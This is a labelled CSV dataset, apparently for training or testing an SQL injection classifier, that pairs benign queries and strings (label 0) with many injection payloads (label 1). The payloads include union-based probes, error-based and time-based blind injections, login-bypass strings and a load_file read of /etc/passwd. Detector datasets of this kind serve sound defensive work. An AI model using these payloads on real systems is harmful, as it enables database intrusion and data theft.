Query,Label
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",1
SELECT * FROM  ( SELECT discuss FROM quietly ),0
"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"antigua de ancora s/n,",0
6.18738E+15,0
SELECT TOP 3 * FROM program,0
4.26048E+15,0
"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",1
8.69184E+15,0
SELECT * FROM protection WHERE gold = 'involved'  AND City = 'poem',0
SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM few,0
1  )   as pqle where 4039  =  4039 and 7533  =  7533--,1
SELECT COUNT ( grabbed ) FROM origin,0
2.97358E+15,0
SELECT AVG ( pie ) FROM value,0
"SELECT expect,thou,great FROM winter LEFT JOIN Orders ON forget.blockID =  gold.paid ORDER BY television.across",0
SELECT * FROM universe WHERE clothes = 'catch' LIMIT 3,0
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1
"1""  )   union all select null,null,null,null,null,null,null,null,null#",1
magrans ribes,0
SELECT COUNT ( frightenID ) FROM soap,0
SELECT * FROM behind WHERE hat = 'dirt' LIMIT 3,0
"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1
"INSERT INTO down  ( myself, important, coal )  VALUES  ( 'while', 'scientific', 'fourth' )",0
SELECT * FROM sing WHERE shot = 'build',0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM managed WHERE fish = 'pencil' LIMIT 3,0
(  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ),1
SELECT * FROM protection FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM higher,0
petruck,0
2969,0
(  select   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  select 6714 from master..sysdatabases  )   end   )    ),1
"-1985%'   )    )     )   union all select 3051,3051,3051--",1
SELECT * FROM strange WHERE hungry BETWEEN 'war' AND 'past',0
1' in boolean mode  )   order by 1--,1
baquerizo amatll,0
SELECT * FROM nearby WHERE closely BETWEEN several09/01/1996kind AND muscle15/31/1996relationship,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53820 )  ORDER BY meta_id ASC",0
ab_ogadora,0
1 and sleep  (  5  )  -- ruuv,1
1'  )   where 6624  =  6624 and 5392  =  8258,1
1' where 8231  =  8231,1
"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )",0
admin' #,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,1
"SELECT onceID AS ID, young AS modern FROM knife",0
regueras de arriba,0
busqu,0
"UPDATE steam SET rabbit =  'slipped', City =  'inside' WHERE cast =  pleasure",0
"SELECT castle,skin FROM double WHERE root = 'duty' UNION SELECT water, studying FROM nation",0
aguilar de cods,0
SELECT * FROM nearby WHERE    NOT toward = 'letter',0
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT * FROM reader FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT shape FROM kill,0
SELECT * FROM sight WHERE island = 'island' FETCH FIRST 3 ROWS ONLY,0
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_link' LIMIT 1,0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1
SELECT AVG ( Price ) FROM potatoes,0
SELECT DISTINCT court FROM life,0
"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
salv sagra,0
1 where 6365  =  6365,1
SELECT * FROM gulf WHERE salmon NOT BETWEEN 'town' AND 'curve',0
SELECT around ( s FROM former RIGHT JOIN,0
charmion,0
SELECT * FROM  ( SELECT mood FROM fairly ),0
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
SELECT * FROM particular WHERE past NOT LIKE 'shout%',0
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,1
"1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --",1
"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1
*',1
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
31790,0
SELECT * FROM  ( SELECT prove FROM individual ),0
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1
SELECT * FROM power WHERE thick = 'accept'  AND City = 'native',0
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'hgwt' like 'hgwt,1
tottenham@satellites.py,0
SELECT * FROM come 3 SELECT * FROM coffee,0
"SELECT globe, castle+ ', ' + level+ ' ' + obtain+ ', ' + route AS basic  FROM next",0
"SELECT original,policeman FROM guide WHERE away = 'bright' UNION SELECT keep, coffee FROM grow",0
and 1 in   (  select var from temp  )  --,1
karla,0
DELETE FROM coal WHERE dozen = 'widely',0
"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,1
overman@saavedradiaz.travel,0
globula*riceo,0
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,1
molet,0
SELECT * FROM wind WHERE NOT basis = 'soon'  AND NOT land = 'front',0
16601924h,0
"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '715' )  ORDER BY tr.object_id ASC,0
SELECT TOP 3 * FROM principal WHERE although = 'freedom',0
SELECT * FROM buy WHERE vapor  BETWEEN 10 AND 20,0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
deli6escenci1,0
ganoza,0
SELECT DISTINCT rose FROM public,0
"UPDATE collect SET pocket =  'particular', City =  'rest' WHERE struck =  limited",0
1'+  (  select kzgg where 5070  =  5070,1
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1
7ar82fa,0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
SELECT grabbed ( s )  FROM moon,0
"-5624' union all select 3723,3723,3723,3723,3723--",1
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1
SELECT AVG ( struggle )  FROM wave  SELECT SUM ( each ),0
select   (  case when   (  2768  =  8868  )   then 2768 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT park FROM divide,0
"1'   )    )    union all select null,null,null,null,null#",1
SELECT TOP 3 * FROM globe WHERE slight = 'early' SELECT * FROM shadow,0
SELECT TOP 3 * FROM face WHERE coming = 'suggest',0
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",1
5.12155E+14,0
matie,0
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ),0
SELECT * FROM someone WHERE older = 'sport' FETCH FIRST 3 ROWS ONLY,0
"SELECT MID ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0
SELECT TOP 3 * FROM wrong WHERE bar = 'afraid',0
SELECT * FROM division,0
marquand@eneltajo.bn,0
SELECT * FROM  ( SELECT while FROM kids ),0
"SELECT * FROM announced WHERE lesson BETWEEN ""sometime"" AND    ""habit""",0
"SELECT SUBSTR ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1
1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,1
standiford@elpaisaje.bg,0
artigas girut,0
SELECT MIN ( jet )  AS money FROM transportation,0
SELECT TOP 50 PERCENT * FROM walk,0
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr",1
SELECT help ( s )  FROM particular,0
SELECT COUNT ( construction ) FROM gate,0
"and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
nagyszeder.kehoe@creacionesacampada.es,0
robledillo de la jara,0
SELECT MIN ( principal )  AS horse FROM observe,0
SELECT * FROM definition,0
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
select * from users where id  =  1.<@$ or 1  =  1 -- 1,1
bockaj,0
SELECT * FROM prize WHERE accurate IN  ( SELECT season FROM face ),0
SELECT * FROM letter WHERE flight = 'underline'  AND  ( dance = 'basket' OR appearance = 'magnet' ),0
mullinar_lemanska@gallegonicolas.ps,0
"SELECT * FROM bar WHERE faster BETWEEN ""suggest"" AND    ""studying""",0
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'zurf'  =  'zurf",1
c/ francia-urb.s.nicolas 171,0
SELECT * FROM happened WHERE rice = 'giant',0
ben,0
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0
"calle limones, 60,",0
08686877f,0
SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved,0
"1' where 9605  =  9605 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
b4rl942r7,0
SELECT * FROM rich WHERE seven NOT LIKE 'theory%',0
4.59244E+15,0
keely4,0
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh",1
ateniesa,0
"1 where 8333  =  8333 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT Count ( * )  AS whether,0
gemma,0
SELECT TOP 3 * FROM organized,0
6.34182E+15,0
ulls,0
"make_set  (  6174  =  9734,1  )",1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",1
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",1
SELECT * FROM expect WHERE too IN  ( SELECT cheese FROM save ),0
1   )    )    as smtf where 5829  =  5829,1
torre de arcas,0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1
"-8053"" where 5458  =  5458 or 9323  =  9323#",1
lemin@11horas.mz,0
SELECT * FROM north WHERE metal BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT shout AS pay, wish AS [breakfast]  FROM port",0
"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT image,0
SELECT * FROM whistle WHERE some = 'door',0
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
uni/**/on sel/**/ect,1
"1' union all select null,null,null,null,null,null,null,null,null#",1
reinhard,0
"SELECT Employees.ready, COUNT ( Orders.abilityID )  AS usualFROM    ( OrdersINNER JOIN lady ON Orders.wholeID  =  Employees.everythingID )",0
1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1
SELECT COUNT ( nobody ) FROM coffee,0
"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",1
SELECT option_value FROM wp_options WHERE option_name  =  'user_registration_email_setting_disable_email' LIMIT 1,0
stiller_kimball@socimi.com.ic,0
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT TIME ( NULL ) ;,0
1.45569E+15,0
UPDATE exercise SET arm = 'location'WHERE stove = 'organized',0
SELECT TOP 3 * FROM harder WHERE today = 'poet',0
"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT AVG ( twice ) FROM fair,0
SELECT TOP 50 PERCENT * FROM bone,0
"SELECT * FROM mirror ORDER BY too ASC, particularly DESC",0
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
"calle del derecho 17,",0
SELECT LOG10 ( 4.5 ) ;,0
SELECT * FROM as WHERE work  BETWEEN 10 AND 20,0
SELECT Count ( * )  AS instant,0
minera dauns,0
silvita,0
keehn,0
cap!tar,0
SELECT * FROM  ( SELECT baseball FROM soon ),0
"1"" union all select null,null,null,null,null,null#",1
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
ruqiang,0
"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )",1
SELECT * FROM birthday ORDER BY court DESC,0
"SELECT COUNT ( follow ) , grain FROM us BY pain",0
SELECT AVG ( Price ) FROM melted,0
"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM capital  WHERE heard = judge,0
select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,1
SELECT * FROM wild WHERE NOT sleep = 'halfway'  AND NOT union = 'create',0
1  )   and sleep  (  5  )  #,1
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )",1
SELECT * FROM cell FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select   (  case when   (  8642  =  6049  )   then 1 else 8642*  (  select 8642 from master..sysdatabases  )   end  )  --,1
SELECT serve,0
sliter,0
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""nthu"" like ""nthu",1
cecile,0
"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
4.78072E+15,0
SELECT * FROM visit WHERE Price NOT BETWEEN 10 AND 20,0
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
danis,0
07383536f,0
31013,0
SELECT human ( s )  FROM sheet FULL OUTER JOIN,0
pl. heroes de espaa 20 11?g,0
mara beln,0
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1
1'+  (  select hett where 7228  =  7228,1
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""cmhh"" like ""cmhh",1
SELECT rich ( s )  FROM sail UNION ALL,0
"1""  )   union all select null,null,null,null,null,null,null,null,null--",1
"select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1
SELECT * FROM thou FETCH FIRST 3 ROWS ONLY,0
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1
apo695169or6,0
6.90524E+15,0
nicolalde llovet,0
34481916v,0
pillo,0
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",1
"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
SELECT ISNULL ( NULL ) ;,0
SELECT AVG ( office ) FROM among,0
1'||  (  select 'mwpd' where 2887  =  2887,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",1
""" or true--",1
8.38E+15,0
"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"1   )    )    union all select null,null,null,null#",1
"UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear",0
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
teodosio,0
"1'   )    )    union all select null,null,null,null--",1
"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--",1
9.32767E+15,0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )",1
8.49643E+15,0
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
3.20326E+15,0
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",1
SELECT AVG ( weigh ) FROM pay,0
DELETE FROM somebody WHERE organized = 'respect',0
monforte del cid,0
edelweis,0
SELECT * FROM whole ORDER BY night DESC,0
1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,1
"SELECT COUNT ( seat ) , mental FROM one BY best",0
SELECT * FROM society,0
padr pavajeau,0
SELECT COUNT ( DISTINCT gently )  FROM magnet,0
selj@ebaz.travel,0
triantap,0
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,1
SELECT MIN ( printed )  AS lips FROM is,0
"-9959""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vcwc""  =  ""vcwc",1
SELECT UPPER ( CustomerName )  AS UppercaseCustomerName FROM Customers;,0
SELECT * FROM dangerous,0
1'   )    )    as yqek where 1957  =  1957,1
1'  )   as mzby where 6530  =  6530,1
"select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",1
